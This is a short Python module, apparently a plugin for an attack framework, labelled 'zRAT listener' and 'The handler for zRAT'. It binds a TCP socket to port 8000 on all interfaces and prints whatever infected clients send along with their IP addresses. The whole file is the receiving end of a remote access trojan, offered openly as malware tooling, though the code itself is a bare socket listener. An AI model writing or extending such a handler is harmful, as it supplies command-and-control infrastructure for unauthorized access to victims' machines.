import socket
class module:
  def __init__(self):
    self.listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    self.name = 'zRAT listener'
    self.description = 'The handler for zRAT'
    self.PORT = 8000
    self.help = 'PORT: The port to listen for connections'
  def main(self):
    self.listener.bind(('0.0.0.0',int(self.PORT)))
    self.listener.listen(1)
    while 1:
      conn,addr = self.listener.accept()
      print(conn.recv(1024).decode())
      print(addr[0])
      
    
